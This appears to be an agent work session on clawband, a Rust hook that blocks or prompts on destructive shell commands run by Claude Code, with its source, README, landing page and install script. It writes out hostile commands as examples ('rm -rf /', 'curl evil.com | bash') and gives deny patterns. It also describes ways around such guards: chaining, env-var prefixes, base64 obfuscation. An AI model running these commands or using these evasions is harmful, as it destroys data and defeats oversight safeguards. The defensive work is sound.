178	// ─── Built-in ask patterns ────────────────────────────────────────────────────

180	fn builtin_ask() -> Vec<Pattern> {
181	    let specs: &[(&str, &str)] = &[
182	        // eval — common in shell init but executes arbitrary strings
183	        ("eval", r"\beval\s"),
184	        // Destructive git (local) — legitimate but irreversible without reflog
185	        ("git reset --hard", r"\bgit\s+reset\s+--hard\b"),
186	        ("git checkout -- ", r"\bgit\s+checkout\s+--\s"),
187	        ("git stash drop", r"\bgit\s+stash\s+drop\b"),
188	        ("git stash clear", r"\bgit\s+stash\s+clear\b"),
189	        // git clean — wipes untracked files, unrecoverable
190	        ("git clean", r"\bgit\s+clean\s+-[fxd]"),
191	        // Remote branch deletion
192	        ("git push --delete", r"\bgit\s+push\b.*--delete\b"),
193	        // git restore without --staged — discards working tree changes
194	        // [^-] matches a path arg; skips flags so `git restore --staged` is not caught
195	        ("git restore", r"\bgit\s+restore\s+[^-]"),
196	        // git branch -D — force-deletes branch regardless of merge status
197	        // (?-i:-D) disables the outer (?i) for just -D so lowercase -d isn't caught
198	        ("git branch -D", r"\bgit\s+branch\s+(?-i:-D)\b"),
199	        // docker rm -f — force-removes a running container
200	        (
201	            "docker rm -f",
202	            r"\bdocker\s+(?:container\s+)?rm\b.*\s-f(\s|$)",
203	        ),
204	        // Compiled/bytecode runners — can't scan the binary/JAR/module for content
205	        ("java -jar", r"\bjava\b.*\s-jar\s"),
206	        ("go run", r"\bgo\s+run\b"),
207	        ("cargo run", r"\bcargo\s+run\b"),
208	    ];
209	    specs.iter().map(|(l, p)| Pattern::builtin(l, p)).collect()
210	}

214	fn load_patterns(path: &PathBuf) -> Vec<Pattern> {
215	    let Ok(text) = fs::read_to_string(path) else {
216	        return vec![];
217	    };
218	    text.lines()
219	        .map(str::trim)
220	        .filter(|l| !l.is_empty() && !l.starts_with('#'))
221	        .filter_map(Pattern::from_user)
222	        .collect()

229	// ─── RTK prefix stripping ─────────────────────────────────────────────────────
230	
231	fn strip_rtk(cmd: &str) -> String {
232	    // Strip "rtk " and "rtk proxy " prefixes, then the git -C <dir> wrapper RTK adds
233	    let rtk = Regex::new(r"^rtk\s+(?:proxy\s+)?").unwrap();
234	    let git_c = Regex::new(r"^git\s+-C\s+\S+\s+").unwrap();
235	    let s = rtk.replace(cmd, "");
236	    git_c.replace(&s, "git ").into_owned()
237	}
238	
239	// ─── sqz suffix stripping ─────────────────────────────────────────────────────
240	
241	fn strip_sqz(cmd: &str) -> String {
242	    // sqz rewrites "git status" → "git status 2>&1 | sqz compress --cmd git"
243	    // Strip the appended sqz pipeline so patterns match the original command.
244	    let sqz = Regex::new(r"\s*2>&1\s*\|\s*sqz\s+compress\b.*$").unwrap();
245	    sqz.replace(cmd, "").into_owned()
246	}
247	
248	// ─── Script file scanning ────────────────────────────────────────────────────
249	// When an interpreter runs a script file, read it and check each line against
250	// deny/ask patterns. Handles shell, Python, JS/TS, Perl, and Lua files.
251	// Skips inline-execution flags (-c, -m, -e). Unreadable paths fail gracefully.
252	
253	fn extract_script_path(command: &str) -> Option<String> {
254	    // Match: (bash|sh|zsh|dash|python3?|node|deno) [optional-flags] <path>
255	    let re = Regex::new(
256	        r"(?i)^\s*(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|node|deno|perl|lua[0-9.]*)\s+((?:-[a-zA-Z]+\s+)*)(.+)$"
257	    ).unwrap();
258	    let caps = re.captures(command)?;
259	    let flags = &caps[1];
260	    // -c  → shell/python inline command string
261	    // -m  → python module (e.g. python3 -m pytest)
262	    // -e / --eval → node inline eval
263	    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
264	        .unwrap()
265	        .is_match(flags)
266	    {
267	        return None;
268	    }
269	    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
270	    // First token only — ignore script arguments after the path
271	    let path = path_str.split_whitespace().next()?;
272	    Some(path.to_string())
273	}
274	
275	fn scan_script_file(
276	    path: &str,
277	    deny_pats: &[Pattern],
278	    ask_pats: &[Pattern],
279	    allow_pats: &[Pattern],
280	) -> Option<(String, String)> {
281	    let content = fs::read_to_string(path).ok()?;
282	    let is_js = path.ends_with(".js")
283	        || path.ends_with(".mjs")
284	        || path.ends_with(".ts")
285	        || path.ends_with(".tsx");
286	    let is_lua = path.ends_with(".lua");
287	    let mut in_block_comment = false;
288	
289	    for (lineno, raw_line) in content.lines().enumerate() {
290	        let line = raw_line.trim();
291	        if line.is_empty() {
292	            continue;
293	        }
294	
295	        // JS/TS block comment state: /* ... */
296	        if is_js {
297	            if in_block_comment {
298	                if line.contains("*/") {
299	                    in_block_comment = false;
300	                }
301	                continue;
302	            }
303	            if line.starts_with("/*") {
304	                in_block_comment = !line.contains("*/");
305	                continue;
306	            }
307	            if line.starts_with("//") || line.starts_with('*') {
308	                continue;
309	            }
310	        }
311	
312	        // Lua comment state: --[[ ... ]] block comments and -- line comments
313	        if is_lua {
314	            if in_block_comment {
315	                if line.contains("]]") {
316	                    in_block_comment = false;
317	                }
318	                continue;
319	            }
320	            if line.starts_with("--[[") {
321	                in_block_comment = !line.contains("]]");
322	                continue;
323	            }
324	            if line.starts_with("--") {
325	                continue;
326	            }
327	        }
328	
329	        // Shell (#) and Python (#) and Perl (#) line comments
330	        if line.starts_with('#') {
331	            continue;
332	        }
333	
334	        // Reuse compound-command splitting so `foo && rm -rf /` is caught
335	        let clean = strip_safe_pipes(line);
336	        for segment in &split_segments(&clean) {
337	            if allow_pats.iter().any(|p| p.matches(segment)) {
338	                continue;
339	            }
340	            for pat in deny_pats {
341	                if pat.matches(segment) {
342	                    return Some((
343	                        "deny".into(),
344	                        format!(
345	                            "Blocked: '{}' in {}:{}: {}",
346	                            pat.label,
347	                            path,
348	                            lineno + 1,
349	                            segment
350	                        ),
351	                    ));
352	                }
353	            }
354	            for pat in ask_pats {
355	                if pat.matches(segment) {
356	                    return Some((
357	                        "ask".into(),
358	                        format!(
359	                            "Review before running — '{}' in {}:{}: {}",
360	                            pat.label,
361	                            path,
362	                            lineno + 1,
363	                            segment
364	                        ),
365	                    ));
366	                }
367	            }
368	        }
369	    }
370	    None
371	}

375	fn check_force_push(cmd: &str) -> Option<String> {
376	    // Only applies to git push commands
377	    if !Regex::new(r"(?i)\bgit\s+push\b").unwrap().is_match(cmd) {
378	        return None;
379	    }
380	    // Strip --force-with-lease (safe alternative) first
381	    let strip_fwl = Regex::new(r"(?i)--force-with-lease(?:=\S+)?").unwrap();
382	    let cleaned = strip_fwl.replace_all(cmd, "");
383	    // Then block --force or -f anywhere in the command
384	    if Regex::new(r"(?i)\s--force(\s|$)|\s-f(\s|$)")
385	        .unwrap()
386	        .is_match(&cleaned)
387	    {
388	        Some("Blocked: git push --force / -f (use --force-with-lease instead)".into())
389	    } else {
390	        None
391	    }
392	}
393	
394	// ─── Safe inline pipe stripping ───────────────────────────────────────────────
395	// Remove  | python3 -c "..."  and  | python3 -m mod  before pipe checks.
396	// These are visible inline code, not supply-chain risks.
397	
398	fn strip_safe_pipes(cmd: &str) -> String {
399	    let c = Regex::new(r"(?i)\|\s*(python3?|node)\s+-c\s+[^|;&`$]*").unwrap();
400	    let m = Regex::new(r"(?i)\|\s*(python3?|node)\s+-m\s+\S+").unwrap();
401	    let s = c.replace_all(cmd, "");
402	    m.replace_all(&s, "").into_owned()
403	}
404	
405	// ─── Compound command splitting ───────────────────────────────────────────────
406	// Split on &&, ||, ; and newlines.
407	// Single | is NOT a splitter — keeps pipe-to-interpreter in one segment.
408	// \; and \| are escaped before splitting so find -exec and regex patterns survive.
409	
410	fn split_segments(cmd: &str) -> Vec<String> {
411	    const ESC_SEMI: &str = "\x01S\x01";
412	    const ESC_PIPE: &str = "\x01P\x01";
413	    const SEP: &str = "\x01SEP\x01";
414	
415	    let s = cmd.replace("\\;", ESC_SEMI).replace("\\|", ESC_PIPE);
416	
417	    let splitter = Regex::new(r"[ \t]*(\|\||&&|;|\n)[ \t]*").unwrap();
418	    let s = splitter.replace_all(&s, SEP);
419	
420	    s.split(SEP)
421	        .map(|seg| seg.trim().replace(ESC_SEMI, "\\;").replace(ESC_PIPE, "\\|"))
422	        .filter(|s| !s.is_empty())
423	        .collect()
424	}
425	
426	// ─── Stats command ────────────────────────────────────────────────────────────
427	
428	fn cmd_stats() {
429	    const VERSION: &str = env!("CARGO_PKG_VERSION");
430	    let cfg = config_dir();
431	    let home = env::var("HOME").unwrap_or_default();
432	
433	    let builtin_deny_count = builtin_deny().len();
434	    let builtin_ask_count = builtin_ask().len();
435	
436	    let count_file = |name: &str| -> (usize, bool) {
437	        let path = cfg.join(name);
438	        let exists = path.exists();
439	        let n = load_patterns(&path).len();
440	        (n, exists)
441	    };
442	    let (user_deny, deny_exists) = count_file("deny.patterns");
443	    let (user_ask, ask_exists) = count_file("ask.patterns");
444	    let (user_allow, allow_exists) = count_file("allow.patterns");
445	
446	    let rtk = env::var("RTK_ENABLED").as_deref() == Ok("1");
447	    let sqz = env::var("SQZ_ENABLED").as_deref() == Ok("1");
448	    let logging = env::var("CLAWBAND_LOG").as_deref() == Ok("1");
449	    let log_path = PathBuf::from(&home).join(".clawband.log");
450	
451	    // Parse audit log if present
452	    let (log_deny, log_ask) = if log_path.exists() {
453	        fs::read_to_string(&log_path)
454	            .unwrap_or_default()
455	            .lines()
456	            .fold((0u64, 0u64), |(d, a), line| {
457	                if line.contains("] DENY |") {
458	                    (d + 1, a)
459	                } else if line.contains("] ASK |") {
460	                    (d, a + 1)
461	                } else {
462	                    (d, a)
463	                }
464	            })
465	    } else {
466	        (0u64, 0u64)
467	    };
468	
469	    let g = "\x1b[32m"; // green
470	    let y = "\x1b[33m"; // yellow
471	    let b = "\x1b[34m"; // blue
472	    let d = "\x1b[2m"; // dim
473	    let r = "\x1b[0m"; // reset
474	    let bold = "\x1b[1m";
475	
476	    println!("\n{bold}clawband v{VERSION}{r}\n");
477	
478	    println!("{bold}Built-in patterns{r}");
479	    println!("  {g}deny{r}   {bold}{builtin_deny_count}{r}");
480	    println!("  {y}ask{r}    {bold}{builtin_ask_count}{r}");
481	
482	    println!("\n{bold}User patterns{r}  {d}(~/.clawband/){r}");
483	    let file_status = |exists: bool, n: usize| -> String {
484	        if !exists {
485	            format!("{d}file not found{r}")
486	        } else if n == 0 {
487	            format!("{d}0 patterns{r}")
488	        } else {
489	            format!("{bold}{n}{r} loaded")
490	        }
491	    };
492	    println!("  deny.patterns    {}", file_status(deny_exists, user_deny));
493	    println!("  ask.patterns     {}", file_status(ask_exists, user_ask));
494	    println!(
495	        "  allow.patterns   {}",
496	        file_status(allow_exists, user_allow)
497	    );
498	
499	    println!("\n{bold}Options{r}");
500	    let flag = |on: bool| {
501	        if on {
502	            format!("{g}on{r}")
503	        } else {
504	            format!("{d}off{r}")
505	        }
506	    };
507	    println!("  RTK_ENABLED    {}", flag(rtk));
508	    println!("  SQZ_ENABLED    {}", flag(sqz));
509	    println!("  CLAWBAND_LOG   {}", flag(logging));
510	
511	    println!("\n{bold}Audit log{r}");
512	    if log_path.exists() {
513	        let total = log_deny + log_ask;
514	        println!(
515	            "  {b}{}{r}  {d}({}){r}",
516	            log_path.display(),
517	            if total == 0 {
518	                "empty".to_string()
519	            } else {
520	                format!("{total} events")
521	            }
522	        );
523	        if total > 0 {
524	            println!("  {g}deny{r}   {bold}{log_deny}{r}");
525	            println!("  {y}ask{r}    {bold}{log_ask}{r}");
526	        }
527	    } else if logging {
528	        println!("  {d}enabled — no events yet{r}");
529	    } else {
530	        println!("  {d}set CLAWBAND_LOG=1 in clawband to activate{r}");
531	    }
532	
533	    println!();
534	}
535	
536	// ─── Core check logic ────────────────────────────────────────────────────────
537	// Returns Some(("deny"|"ask", reason)) or None for pass.
538	// Does NOT perform script-file scanning (requires filesystem) or subshell checks.
539	
540	fn check_command<'a>(
541	    command: &str,
542	    deny_pats: &'a [Pattern],
543	    ask_pats: &'a [Pattern],
544	    allow_pats: &'a [Pattern],
545	) -> Option<(&'a str, String)> {
546	    let clean = strip_safe_pipes(command);
547	    let segments = split_segments(&clean);
548	
549	    for segment in &segments {
550	        if allow_pats.iter().any(|p| p.matches(segment)) {
551	            continue;
552	        }
553	
554	        if let Some(reason) = check_force_push(segment) {
555	            return Some(("deny", reason));
556	        }
557	
558	        for pat in deny_pats {
559	            if pat.matches(segment) {
560	                return Some((
561	                    "deny",
562	                    format!("Blocked: '{}' matched in: {}", pat.label, segment),
563	                ));
564	            }
565	        }
566	
567	        for pat in ask_pats {
568	            if pat.matches(segment) {
569	                return Some((
570	                    "ask",
571	                    format!(
572	                        "Review before running — '{}' matched in: {}",
573	                        pat.label, segment
574	                    ),
575	                ));
576	            }
577	        }
578	    }
579	    None
580	}
581	
582	// ─── Main ─────────────────────────────────────────────────────────────────────
583	
584	fn main() {
585	    // CLI subcommands
586	    let args: Vec<String> = env::args().collect();
587	    if args.get(1).map(|s| s.as_str()) == Some("stats") {
588	        cmd_stats();
589	        return;
590	    }
591	    if args.get(1).map(|s| s.as_str()) == Some("--version")
592	        || args.get(1).map(|s| s.as_str()) == Some("-v")
593	    {
594	        println!("clawband v{}", env!("CARGO_PKG_VERSION"));
595	        return;
596	    }
597	
598	    let mut input = String::new();
599	    let _ = io::stdin().read_to_string(&mut input);
600	
601	    // Parse command from Claude Code hook JSON: {"tool_input": {"command": "..."}}
602	    let v: serde_json::Value = match serde_json::from_str(&input) {
603	        Ok(v) => v,
604	        Err(_) => return,
605	    };
606	    let command = match v["tool_input"]["command"].as_str() {
607	        Some(s) if !s.is_empty() => s.to_string(),
608	        _ => return,
609	    };
610	
611	    if env::var("CLAWBAND_SKIP").as_deref() == Ok("1") {
612	        return;
613	    }
614	
615	    let rtk_enabled = env::var("RTK_ENABLED").as_deref() == Ok("1");
616	    let sqz_enabled = env::var("SQZ_ENABLED").as_deref() == Ok("1");
617	    let log_enabled = env::var("CLAWBAND_LOG").as_deref() == Ok("1");
618	
619	    let command = if rtk_enabled {
620	        strip_rtk(&command)
621	    } else {
622	        command
623	    };
624	    let command = if sqz_enabled {
625	        strip_sqz(&command)
626	    } else {
627	        command
628	    };
629	
630	    // Load all patterns
631	    let cfg = config_dir();
632	    let mut deny_pats = builtin_deny();
633	    let mut ask_pats = builtin_ask();
634	    let allow_pats = load_patterns(&cfg.join("allow.patterns"));
635	    deny_pats.extend(load_patterns(&cfg.join("deny.patterns")));
636	    ask_pats.extend(load_patterns(&cfg.join("ask.patterns")));
637	
638	    let emit = |decision: &str, reason: &str| {
639	        if log_enabled {
640	            log_action(decision, reason, &command);
641	        }
642	        output(decision, reason);
643	    };
644	
645	    // Core pattern check (deny/ask/pass)
646	    if let Some((decision, reason)) = check_command(&command, &deny_pats, &ask_pats, &allow_pats) {
647	        emit(decision, &reason);
648	        return;
649	    }
650	
651	    // Script file scanning: if command is `bash ./foo.sh`, read and check the file.
652	    if let Some(script_path) = extract_script_path(&command) {
653	        if let Some((decision, reason)) =
654	            scan_script_file(&script_path, &deny_pats, &ask_pats, &allow_pats)
655	        {
656	            emit(&decision, &reason);
657	            return;
658	        }
659	    }
660	
661	    // Subshell syntax: $() and backticks embed commands that can't be split above.
662	    // Ask rather than block — common in legitimate commands.
663	    if command.contains("$(") || command.contains('`') {
664	        emit(
665	            "ask",
666	            "Command contains subshell ($() or backtick) — review before running.",
667	        );
668	    }
669	}

```text
1	# clawband
2	
3	A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.
4	
5	Written in Rust: single binary, sub-millisecond execution, proper regex engine.
6	
7	## What it does
8	
9	Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:
10	
11	- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
12	- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
13	- **Loads user-defined pattern files** so you can customise behaviour without touching the binary
14	
15	### Why compound-command splitting matters
16	
17	A naive check on the full command string misses chained attacks like:
18	
19	```sh
20	ls -la && rm -rf /
21	```
22	
23	clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.
24	
25	Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.
26	
27	## Installation
28	
29	Requires Rust (`cargo`) and `jq`.
30	
31	```sh
32	bash install.sh
33	```
34	
35	The installer builds the binary, installs it to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.
36	
37	### Manual installation
38	
39	```sh
40	cargo build --release
41	mkdir -p ~/.claude/hooks
42	cp target/release/clawband ~/.claude/hooks/clawband
43	chmod +x ~/.claude/hooks/clawband
44	```
45	
46	Add to `~/.claude/settings.json`:
47	
48	```json
49	{
50	  "hooks": {
51	    "PreToolUse": [
52	      {
53	        "matcher": "Bash",
54	        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
55	      }
56	    ]
57	  }
58	}
59	```
60	
61	## Built-in patterns
62	
63	### Blocked (deny)
64	
65	| Category | Examples |
66	|----------|---------|
67	| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
68	| Silent file emptying | `truncate -s 0` |
69	| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
70	| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
71	| Database destruction | `dropdb` |
72	| Docker destruction | `docker system prune` |
73	| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
74	| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
75	| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
76	| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
77	| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
78	| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
79	| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |
80	
81	### Prompted (ask)
82	
83	| Category | Examples |
84	|----------|---------|
85	| eval | `eval ` — common in shell init but executes arbitrary strings |
86	| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
87	| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
88	| Remote branch deletion | `git push --delete` |
89	| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
90	| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
91	| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
92	
93	### Safe patterns preserved
94	
95	- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
96	- `| python3 -m module` — module invocation is allowed
97	- `--force-with-lease` — safe alternative to force push
98	- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator
99	
100	## Custom patterns
101	
102	Extend or override behaviour by editing files in `~/.clawband/`:
103	
104	| File | Effect |
105	|------|--------|
106	| `deny.patterns` | Always block — added to built-in deny list |
107	| `ask.patterns` | Always prompt — added to built-in ask list |
108	| `allow.patterns` | Override any block — matching commands skip all checks |
109	
110	Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.
111	
112	See `deny.patterns.example` and `ask.patterns.example` for the format.
113	
114	```sh
115	# ~/.clawband/deny.patterns — add project-specific blocks
116	docker system prune
117	my-infra nuke --all
118	
119	# ~/.clawband/allow.patterns — whitelist specific safe usages
120	git reset --hard HEAD$
121	```
122	
123	## Options
124	
125	Set as environment variables (in your shell profile, or prefixed on the hook command):
126	
127	| Variable | Default | Effect |
128	|----------|---------|--------|
129	| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
130	| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
131	| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
132	| `CLAWBAND_SKIP` | `0` | Bypass all checks (for trusted wrapper scripts) |
133	
134	## Requirements
135	
136	- `bash install.sh`: Rust toolchain (`cargo`), `jq`
137	- Runtime: none (single static binary)
138	
139	## Limitations
140	
141	- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
142	- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
143	- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
144	- **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
145

No open issues or PRs. Here's my full situational awareness:

---

**clawband v2.5.0** — Rust PreToolUse hook for Claude Code's Bash tool

**Architecture (single file: `src/main.rs`):**
- Reads hook JSON from stdin, outputs a `permissionDecision` JSON response
- Three tiers: `deny` (hard block), `ask` (prompt user), pass (silent)
- Compound-command splitting at `&&`, `||`, `;` — single `|` kept whole to catch pipe-to-interpreter attacks
- Script file scanning: reads `.sh`/`.py`/`.js`/`.ts`/`.pl`/`.lua` files and checks each line
- RTK/sqz prefix/suffix stripping to avoid false negatives from those tools
- User customization via `~/.clawband/{deny,ask,allow}.patterns`

**Built-in patterns:**
- Deny: `rm -rf /~`, `mkfs`, `dd`, infra destruction (terraform/kubectl/AWS), pipe to interpreter, heredoc to interpreter, pipe to DB CLIs, `find -delete`, `xargs` escalation, `git push --force`
- Ask: `eval`, destructive local git ops, `git clean`, `git branch -D`, `docker rm -f`, compiled runners (`java -jar`, `go run`, `cargo run`)

**CI:** GitHub Actions — rustfmt + clippy + `cargo test` on push/PR to master

**No open issues or PRs.**

---

The startup context mention of "dedup rules / scheduling / View Results button" looks like it bled in from a different project's session — it doesn't match anything in this codebase.

I'm ready to take on bugs and features. When you get an issue or want something built, bring it here and I'll review, plan, implement, and open a PR for your approval before merging.

_**Agent (claude-sonnet-4-6 2026-06-02 12:12:14Z)**_

A few things stand out after reading the code:

**Test coverage gaps**
- `scan_script_file()` and `extract_script_path()` have zero unit tests — the script scanning feature (added in v2.3–2.5) is completely untested
- `split_segments()` and `strip_safe_pipes()` also untested
- No integration test that pipes real JSON to the binary and checks stdout

**Ruby script scanning missing**
- `ruby` is in the pipe-to-interpreter deny list, but `extract_script_path()` doesn't handle `ruby script.rb` — so `ruby` scripts are never scanned, unlike shell/Python/JS/Perl/Lua

**Patterns worth considering**
- `npx`/`npm exec` — runs arbitrary package code, can't be scanned; probably an `ask` candidate
- `shred` — secure file deletion, irreversible
- `git push :<branch>` — README calls this out as a known gap (colon-prefix remote branch deletion)

**Installation barrier**
- `install.sh` requires `cargo` — publishing pre-built binaries to GitHub Releases would make it zero-dependency to install, which matters for adoption

**Priority order I'd suggest:** test coverage for script scanning first (it's the newest code and most likely to have edge cases), then Ruby scanning, then pre-built releases, then patterns.

Want me to start on any of these?

425	<!-- ── The problem ───────────────────────────────────────────────────────────── -->
426	<section class="problem-section">
427	  <div class="container">
428	    <h2>The gap in Claude Code's built-in protection</h2>
429	
430	    <div class="bypass-callout">
431	      Claude Code lets you add patterns to a deny list in <code>settings.json</code>. You add <code>rm -rf</code>.
432	      You feel protected. <strong>You're not.</strong><br><br>
433	      The built-in system matches the <em>entire command as a glob</em>. It never sees inside a compound command.
434	      Claude can trivially bypass your deny list by chaining the dangerous command after a harmless one —
435	      and this can happen through a hallucination or a prompt injection, not just a deliberate attack.
436	    </div>
437	
438	    <div class="compare-grid">
439	      <div>
440	        <div class="problem-label bad">Without clawband</div>
441	        <div class="terminal">

444	            <span style="margin-left:.5rem;font-size:.75rem;color:var(--muted);font-family:inherit">settings.json deny: ["Bash(rm -rf *)"]</span>
445	          </div>
446	          <div class="term-body">
447	            <div class="comment"># Compound command — safe part runs first</div>
448	            <div class="cmd">echo "cleaning up" &amp;&amp; rm -rf /home/user/projects</div>
449	            <div class="pass-out" style="color:var(--green)">✓ Allowed</div>
450	            <div class="deny-out" style="margin-top:.25rem">💀 /home/user/projects deleted</div>
451	            <br>
452	            <div class="comment"># Env var prefix — glob doesn't match "rm -rf"</div>
453	            <div class="cmd">FORCE=yes rm -rf /important-dir</div>
454	            <div class="pass-out" style="color:var(--green)">✓ Allowed</div>
455	            <div class="deny-out" style="margin-top:.25rem">💀 /important-dir deleted</div>
456	            <br>
457	            <div class="comment"># Semicolon separator — same bypass</div>
458	            <div class="cmd">git status; rm -rf /</div>
459	            <div class="pass-out" style="color:var(--green)">✓ Allowed</div>
460	            <div class="deny-out" style="margin-top:.25rem">💀 Filesystem gone</div>
461	          </div>

471	          </div>

475	            <div class="deny-out">⛔ Blocked: 'rm -rf /' matched in:<br>&nbsp;&nbsp;rm -rf /home/user/projects</div>
476	            <br>

478	            <div class="cmd">FORCE=yes rm -rf /important-dir</div>
479	            <div class="deny-out">⛔ Blocked: 'sudo rm -rf' / 'rm -rf /'<br>&nbsp;&nbsp;matched in: FORCE=yes rm -rf /important-dir</div>
480	            <br>
481	            <div class="comment"># Semicolon splits into two segments</div>
482	            <div class="cmd">git status; rm -rf /</div>
483	            <div class="deny-out">⛔ Blocked: 'rm -rf /' matched in: rm -rf /</div>
484	          </div>
485	        </div>
486	      </div>
487	    </div>

491	<!-- ── How it works ──────────────────────────────────────────────────────────── -->
492	<section>
493	  <div class="container">
494	    <h2>How it works</h2>
495	    <div class="steps">
496	      <div class="step">
497	        <div class="num">01</div>
498	        <h3>Intercepts every command</h3>
499	        <p>Registered as a <code style="font-size:.82rem;background:#010409;padding:.1em .4em;border-radius:4px;color:#4f9cf9">PreToolUse</code> hook — fires before Claude's Bash tool executes anything.</p>
500	      </div>
501	      <div class="step">
502	        <div class="num">02</div>
503	        <h3>Splits compound commands</h3>
504	        <p>The built-in deny list never sees inside <code style="font-size:.82rem;background:#010409;padding:.1em .4em;border-radius:4px;color:#4f9cf9">echo hi &amp;&amp; rm -rf /</code>. clawband splits first, checks every segment independently.</p>
505	      </div>
506	      <div class="step">
507	        <div class="num">03</div>
508	        <h3>Deny, ask, or pass</h3>
509	        <p>Catastrophic patterns are hard-blocked. Risky-but-legitimate ones prompt for approval. Everything else passes instantly.</p>
510	      </div>
511	      <div class="step">
512	        <div class="num">04</div>
513	        <h3>Sub-millisecond</h3>
514	        <p>Written in Rust. Single binary, no subprocesses. ~30ms per hook call vs ~380ms for an equivalent bash implementation.</p>
515	      </div>
516	    </div>
517	  </div>
518	</section>

_**Agent (claude-sonnet-4-6 2026-06-03 09:25:48Z)**_

Good investigation question. Here's what I found about the architecture and what's possible:

**The fundamental constraint:** PreToolUse hooks fire, output a decision, and get zero feedback. Clawband never knows whether the user clicked Allow or Deny after an "ask" — so there's no automatic feedback loop built into the hook protocol.

**What IS possible:**

**1. `clawband allow` CLI subcommand (most practical)**
Add `clawband allow 'git reset --hard'` that appends a regex to `~/.clawband/allow.patterns`. Could also support `--session` to write to `~/.clawband/session.allow.patterns` (loaded at runtime, cleared manually). Include a hint in the "ask" reason string pointing to it:
> "Review before running — 'git reset --hard' matched. To stop being prompted: `clawband allow 'git reset --hard'`"

**2. Breadcrumb + PostToolUse hook**
When clawband says "ask", write `~/.clawband/.last-ask` with the matched pattern. A PostToolUse companion hook reads it (PostToolUse only fires if the command actually ran, i.e. user approved), then outputs a message into Claude's context: *"User approved a prompted command — suggest `clawband allow ...`"*. Claude then surfaces it to the user. More automated but adds a second hook.

**3. Session env var (`CLAWBAND_SESSION_ALLOW`)**
Comma-separated list of regex patterns to allow for the current session only, set in the shell before launching Claude Code. Low friction but requires knowing the pattern upfront.

---

**What's NOT possible:**
- "Allow similar" as a button/choice in the prompt dialog — Claude Code controls that UI, hooks can't add custom options
- Auto-learning without any user action — no feedback channel exists

---

**My recommendation:** Option 1 (`clawband allow` CLI + hint in reason) is clean, low complexity, and directly useful. Option 2 (PostToolUse breadcrumb) is a nice follow-on. Want me to implement Option 1?

9	
10	green()  { printf '\033[32m%s\033[0m\n' "$1"; }
11	yellow() { printf '\033[33m%s\033[0m\n' "$1"; }
12	red()    { printf '\033[31m%s\033[0m\n' "$1"; }
13	
14	# ── Dependencies ──────────────────────────────────────────────────────────────
15	if ! command -v jq &>/dev/null; then
16	  red "Error: jq is required."
17	  echo "  macOS:  brew install jq"
18	  echo "  Ubuntu: sudo apt install jq"
19	  exit 1
20	fi
21	
22	if ! command -v cargo &>/dev/null; then
23	  red "Error: Rust toolchain not found."
24	  echo "  Install: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
25	  echo "  Then re-run this script."
26	  exit 1
27	fi
28	
29	# ── Build ─────────────────────────────────────────────────────────────────────
30	echo "Building clawband..."
31	cargo build --release --manifest-path "$SCRIPT_DIR/Cargo.toml" --quiet
32	green "Build complete"
33	
34	# ── Install binary ────────────────────────────────────────────────────────────
35	mkdir -p "$HOOK_DIR"
36	cp "$SCRIPT_DIR/target/release/clawband" "$HOOK_DIR/clawband"
37	chmod +x "$HOOK_DIR/clawband"
38	green "Installed: $HOOK_DIR/clawband"
39	
40	# ── Create config dir ─────────────────────────────────────────────────────────
41	mkdir -p "$CONFIG_DIR"
42	
43	for f in deny ask; do
44	  if [ ! -f "$CONFIG_DIR/$f.patterns" ]; then
45	    cp "$SCRIPT_DIR/$f.patterns.example" "$CONFIG_DIR/$f.patterns"
46	    green "Created: $CONFIG_DIR/$f.patterns"
47	  else
48	    yellow "Skipped: $CONFIG_DIR/$f.patterns already exists"
49	  fi
50	done
51	
